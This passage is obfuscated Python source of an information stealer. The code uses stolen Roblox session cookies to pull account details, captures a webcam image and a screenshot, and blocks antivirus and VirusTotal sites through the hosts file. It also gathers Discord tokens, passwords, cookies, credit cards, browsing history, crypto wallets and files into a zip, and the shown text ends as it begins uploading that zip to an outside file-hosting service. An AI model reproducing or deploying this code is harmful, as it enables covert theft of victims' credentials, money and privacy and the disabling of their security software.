                    JQWPTIIMUCWMPUPJASMKLVTPZHSONAUMYXVDZGGCUITWBMEKMFDAJSOTHEGZAGWLPITBOINSBUBOGTCFZCXJJCG = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL = json.loads(JQWPTIIMUCWMPUPJASMKLVTPZHSONAUMYXVDZGGCUITWBMEKMFDAJSOTHEGZAGWLPITBOINSBUBOGTCFZCXJJCG.text)
                except:
                    OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL = {"None": "None"}

                HUGHPCYFKEISKQNCQFGLTCSYYBLRRVDDTOHCZAWMENWCBGDPXCKGXUALIMDXQPAPXN = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('id', "None")
                GEXRXZLXYYSWDRKGSVADHOMFCSMFKUYSDZGSGROCDWOBCBXBPOCTVOFVGIMNUOHUWORYGCYM = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('displayName', "None")
                KMVAMONEFHAPERYKTXKWKGUXQWKBPICBRXQJKPJZQRTBAKZYLWT = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('name', "None")
                LHLDUSJIQJZGIXXLTRSBNYKFNLZDEAUBCQSMNIHWTSYHPTPMNJVEJFRQAWOEVQLETKPIRVEPYDDJWFZNRHZZEHFC = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get("RobuxBalance", "None")
                KIOPGXPJOBNVAFUTJYTPMIQCOSUAIRDVWALNPBUAAMRQVZOOSIUYRS = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get("IsPremium", "None")
                UPVCLNWYATJZKYZVLHYBXLXYHZXBSMQRANAYPPKDIAAOXLCLXJULDMVCXQQGPFTWEBWQKYTLPSMBQDJCGPBBNTHSLROZRPTJZ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get("ThumbnailUrl", "None")
                XWTMCNDVQYEZVQZCISKMSPVPPWUMMVAKVJZMDZTKIKLZWQLPBAWUCJONWRFSIXZAIPEPOIZUUHYQFIBGNVKYQ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get("IsAnyBuildersClubMember", "None")
                
                JHYODMGXHZGXNAHHPWBRIQFQPFFTGGTCHYPNSFKPOOOSYFHVZUTHBRINNJMWSMFRL = JHYODMGXHZGXNAHHPWBRIQFQPFFTGGTCHYPNSFKPOOOSYFHVZUTHBRINNJMWSMFRL + f"""
Roblox Account n°{str(YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS)}:
 - Navigator     : {CVDLTRFLTSMGJFKGSXGUDRPFTTGJMDXYOENRVJTDCWISTNFPWTHSGNBPZDMKGLYPEI}
 - Username      : {KMVAMONEFHAPERYKTXKWKGUXQWKBPICBRXQJKPJZQRTBAKZYLWT}
 - DisplayName   : {GEXRXZLXYYSWDRKGSVADHOMFCSMFKUYSDZGSGROCDWOBCBXBPOCTVOFVGIMNUOHUWORYGCYM}
 - Id            : {HUGHPCYFKEISKQNCQFGLTCSYYBLRRVDDTOHCZAWMENWCBGDPXCKGXUALIMDXQPAPXN}
 - Avatar        : {UPVCLNWYATJZKYZVLHYBXLXYHZXBSMQRANAYPPKDIAAOXLCLXJULDMVCXQQGPFTWEBWQKYTLPSMBQDJCGPBBNTHSLROZRPTJZ}
 - Robux         : {LHLDUSJIQJZGIXXLTRSBNYKFNLZDEAUBCQSMNIHWTSYHPTPMNJVEJFRQAWOEVQLETKPIRVEPYDDJWFZNRHZZEHFC}
 - Premium       : {KIOPGXPJOBNVAFUTJYTPMIQCOSUAIRDVWALNPBUAAMRQVZOOSIUYRS}
 - Builders Club : {XWTMCNDVQYEZVQZCISKMSPVPPWUMMVAKVJZMDZTKIKLZWQLPBAWUCJONWRFSIXZAIPEPOIZUUHYQFIBGNVKYQ}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not CJWSXJBVURATURWTOCHTUWVKVEHEBMAKBUAPHKPUFNJRBVTCGFSMONUKXJTQZ:
        JHYODMGXHZGXNAHHPWBRIQFQPFFTGGTCHYPNSFKPOOOSYFHVZUTHBRINNJMWSMFRL = "No roblox cookie found."
        
    SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Roblox Accounts ({YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS}).txt", JHYODMGXHZGXNAHHPWBRIQFQPFFTGGTCHYPNSFKPOOOSYFHVZUTHBRINNJMWSMFRL)

    return YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS

def CWURKYDAADBSFXIKIXOFRTUTPXRJSOWJOPFTIPTEXLUAVWSTEIPYDOCCMVUVPCJDVPK(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import cv2
    import io
    from PIL import Image

    try:
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = "Yes"
        OXBHPTWMISYIHNHRIPFHDZCNPGWQXUIHYRDHCACSBAMNZWLLBKMMGRSHWDDEPNYYRMCELGTVEKKLH = cv2.VideoCapture(0)

        if not OXBHPTWMISYIHNHRIPFHDZCNPGWQXUIHYRDHCACSBAMNZWLLBKMMGRSHWDDEPNYYRMCELGTVEKKLH.isOpened():
            BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = "No webcam found."
            return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture

        v4r_ret, v4r_frame = OXBHPTWMISYIHNHRIPFHDZCNPGWQXUIHYRDHCACSBAMNZWLLBKMMGRSHWDDEPNYYRMCELGTVEKKLH.read()
        OXBHPTWMISYIHNHRIPFHDZCNPGWQXUIHYRDHCACSBAMNZWLLBKMMGRSHWDDEPNYYRMCELGTVEKKLH.release()

        if not v4r_ret:
            BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = "Failed to capture image."
            AFHCMURFWXRSGIXHQEKRQVFQEQEIAPSFLOJBFJAXXKKRZDOXPJLBLMFRMTDZMLRREFJNPBVOF()
            return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture

        SBZNZHWNDMVXCCYYFLTCOTBJOCQBUDKZPSPAEVBITSGIMLLQPVSDXYVRA = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        CYEXEMCQEFIESXDXOIKYAKFTTUWPLWQNPVAMUZQGEOYLTJZXTJWOZPQPBFFGAKXX = Image.fromarray(SBZNZHWNDMVXCCYYFLTCOTBJOCQBUDKZPSPAEVBITSGIMLLQPVSDXYVRA)
        NJANUBQVBGTIKCBZGVSLWKAXKZLVVQLOQDJZMTZUCUIMJUABQCIKLJUQCYCVXMRDUGIRMOONGJCYQAFRNLG = io.BytesIO()
        CYEXEMCQEFIESXDXOIKYAKFTTUWPLWQNPVAMUZQGEOYLTJZXTJWOZPQPBFFGAKXX.save(NJANUBQVBGTIKCBZGVSLWKAXKZLVVQLOQDJZMTZUCUIMJUABQCIKLJUQCYCVXMRDUGIRMOONGJCYQAFRNLG, format='PNG')
        NJANUBQVBGTIKCBZGVSLWKAXKZLVVQLOQDJZMTZUCUIMJUABQCIKLJUQCYCVXMRDUGIRMOONGJCYQAFRNLG.seek(0)
        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr("Webcam.png", NJANUBQVBGTIKCBZGVSLWKAXKZLVVQLOQDJZMTZUCUIMJUABQCIKLJUQCYCVXMRDUGIRMOONGJCYQAFRNLG.read())

        return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture

    except Exception as e:
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = f"Error: {e}"
        return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture

def MVZASYRSKSOEGARGEWBWVBTJOSLSCROULQKGFBRPWDWSAVFOTUYNVHLCLEZJDHZELEDEQJBXGRETRIPTWYHIZEILQCCJR(zip_file):
    import io
    from PIL import ImageGrab

    try:
        HVIDZJWNVKPDWILRBANIEZSKUBBOHLSFVKQZGBCWXMRHVTUPVGNFNJFEOGEUBLWRPQJNOL = "Yes"

        def C4ptur3():
            ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI_bytes = io.BytesIO()
            ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI.save(ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI_bytes, format='PNG')
            ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI_bytes.seek(0)
            return ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI_bytes

        ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", ONBGJHFYDFVNVUVDXGFAQLZMGJFWLDHHIXXYIFRNXMUDVEUTWVKTLIKZAYRSZHZAGGJDXLLKFACIXKUEI_bytes.read())
        return HVIDZJWNVKPDWILRBANIEZSKUBBOHLSFVKQZGBCWXMRHVTUPVGNFNJFEOGEUBLWRPQJNOL
    except Exception as e:
        HVIDZJWNVKPDWILRBANIEZSKUBBOHLSFVKQZGBCWXMRHVTUPVGNFNJFEOGEUBLWRPQJNOL = f"Error: {e}"
        return HVIDZJWNVKPDWILRBANIEZSKUBBOHLSFVKQZGBCWXMRHVTUPVGNFNJFEOGEUBLWRPQJNOL

def HAXRSUYSYAVQKWUETLNWMVOEKLSAPZVPSPXCKELGEAEKGUBOYE():
    import os

    "Perm Admin Required"
    try:
        def PISJGOGNQNIIZSTFEDEQJQZULKVJZTWIMXYWVTOTBHQVPPDUFQGGRGEQBOSJZXHH(QWLFOGZHEXQZGJURUAQSJTIAEPPXGGJCRXILRBRDTELYWUGKGCVIHXAYVWVNOEXQADFCHGAPCRNGIC):
            MAPHDMAUFTSCDNGKTFKXGPUQXUMKNGALGGESXGWVKNRYKWFSOCNNIQFFAECYMFLXUUYZDRZIM = os.path.join(os.environ["WINDIR"], "System32", "drivers", "etc", "hosts")
            if not os.path.exists(MAPHDMAUFTSCDNGKTFKXGPUQXUMKNGALGGESXGWVKNRYKWFSOCNNIQFFAECYMFLXUUYZDRZIM):
                MAPHDMAUFTSCDNGKTFKXGPUQXUMKNGALGGESXGWVKNRYKWFSOCNNIQFFAECYMFLXUUYZDRZIM = os.path.join("C:", "Windows", "System32", "drivers", "etc", "hosts")

            RKWUGITEKCKISHAPMLAQDNJCTSPHPNXHUQRBOWRUBLQAULBLLKZADNRZNWXPWBBOEXCLVNB = "127.0.0.1"
            with open(MAPHDMAUFTSCDNGKTFKXGPUQXUMKNGALGGESXGWVKNRYKWFSOCNNIQFFAECYMFLXUUYZDRZIM, "a") as v4r_file:
                v4r_file.write("\n" + RKWUGITEKCKISHAPMLAQDNJCTSPHPNXHUQRBOWRUBLQAULBLLKZADNRZNWXPWBBOEXCLVNB + " " + QWLFOGZHEXQZGJURUAQSJTIAEPPXGGJCRXILRBRDTELYWUGKGCVIHXAYVWVNOEXQADFCHGAPCRNGIC)
        
        EGIZMROHVQDTBXYQHFPOPXXGIMLVKZITXEAALUVLLOLWHORSKQJAYAISPHDUKJRDULCNZI = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for v4r_w3b51t3_t0_8l0ck in EGIZMROHVQDTBXYQHFPOPXXGIMLVKZITXEAALUVLLOLWHORSKQJAYAISPHDUKJRDULCNZI:
            PISJGOGNQNIIZSTFEDEQJQZULKVJZTWIMXYWVTOTBHQVPPDUFQGGRGEQBOSJZXHH(v4r_w3b51t3_t0_8l0ck)
    except:
        pass

LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH = []

DUPOEEPNTBOWDRRCFUKPDKKYIMMVXHUTCDDHBNNOMTJJJCCFSBCANNPLSBRG = io.BytesIO()
with zipfile.ZipFile(DUPOEEPNTBOWDRRCFUKPDKKYIMMVXHUTCDDHBNNOMTJJJCCFSBCANNPLSBRG, "w", zipfile.ZIP_DEFLATED) as SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG:

    try: 
        KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG = DIQJDUMSKBHDAUEQPEDTXCPPWIQWHYTBHVBGRODWFGKLOREEIDQCZNBKVYVXAHSWQESEGIWCJJKZRYFQBRPFRMMQTRCM()
    except Exception as e:
        KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG = f"Error: {e}"

    try: 
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info = ABKVDUATQPJVZAZYCYZVGPFMDTGWXETKZCUFXOTJRQZUCBPBCULBKVXUBGR(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info = f"Error: {e}"

    try: 
        HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI = CCNBLRSYNBSEQNUKLYLJALPBNSYGYRHQCNTGNVTMOTIHYCNORNWYKGHQQXKDAUBXLBJDSIALCOGODKHNF(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI = f"Error: {e}"

    try: 
        FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM, OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX, ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH, NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ, BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA, CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE = ZFICPVEAEGRKGKYQANZHBGHXZEBBOADZOEOXCVKOSJCRAEIYSKMSHX(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM = f"Error: {e}"
        OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX = f"Error: {e}"
        ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH = f"Error: {e}"
        NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ = f"Error: {e}"
        BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA = f"Error: {e}"
        CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE = f"Error: {e}"

    try: 
        YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS = UKSFOFWCFPPGAXWRKBCRUZCWBMNXBHJZFNMIJQTQQSEJBUNEQEMVNZTBPRUWDOYAMXDXCOQPYKPSRTALWLNBTWMXDLJWVTFT(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS = f"Error: {e}"

    try: 
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = CWURKYDAADBSFXIKIXOFRTUTPXRJSOWJOPFTIPTEXLUAVWSTEIPYDOCCMVUVPCJDVPK(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = f"Error: {e}"

    try: 
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_screenshot = MVZASYRSKSOEGARGEWBWVBTJOSLSCROULQKGFBRPWDWSAVFOTUYNVHLCLEZJDHZELEDEQJBXGRETRIPTWYHIZEILQCCJR(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_screenshot = f"Error: {e}"

    try: 
        EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS, KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX, UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI = HXCEIBTRUFFFHRWXGFQEOCXBNZVDDMZCQIZTDTHJVBCCMJRXNDKGUGKVCVWAW(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_screenshot = f"Error: {e}"

    try: 
        TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA = GJOSVXWLKTMRXULVOQZICOYLZFXGPIZOHCZHMDWJTAYJBSJYKH(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG)
    except Exception as e:
        TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA = f"Error: {e}"

    if KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Discord Injection : {KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG}")

    if BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Camera Capture    : {BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture}")

    if BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_screenshot != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Screenshot        : {BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_screenshot}")

    if BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"System Info       : {BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info}")

    if HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Discord Accounts  : {HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI}")

    if YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Roblox Accounts   : {YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS}")

    if OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Passwords         : {OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX}")

    if ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Cookies           : {ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH}")

    if CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Cards             : {CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE}")

    if NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Browsing History  : {NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ}")

    if BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Download History  : {BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA}")

    if FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Extentions        : {FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM}")

    if EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Wallets           : {EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS}")

    if KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Game Launchers    : {KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX}")
    
    if UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Apps              : {UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI}")
    
    if TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA != None:
        LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH.append(f"Interesting Files : {TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA}")

DUPOEEPNTBOWDRRCFUKPDKKYIMMVXHUTCDDHBNNOMTJJJCCFSBCANNPLSBRG.seek(0)

try:
    try: EIIWLOECCPJBXFQXTIRFAMGPYDBKEKRTUGPWRTIVNLZAPYCUTYPQDDDNHIUGBSNJ = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: EIIWLOECCPJBXFQXTIRFAMGPYDBKEKRTUGPWRTIVNLZAPYCUTYPQDDDNHIUGBSNJ = "store4"

    YXLTPAMPZYVGNMIPAKKOIEJLZSVGUQYLDPDTCTQQPINUDYRUJABVRAFRBDWYRCIKYWYVJYTQDZ = requests.post(
        f"https://{EIIWLOECCPJBXFQXTIRFAMGPYDBKEKRTUGPWRTIVNLZAPYCUTYPQDDDNHIUGBSNJ}.gofile.io/uploadFile",
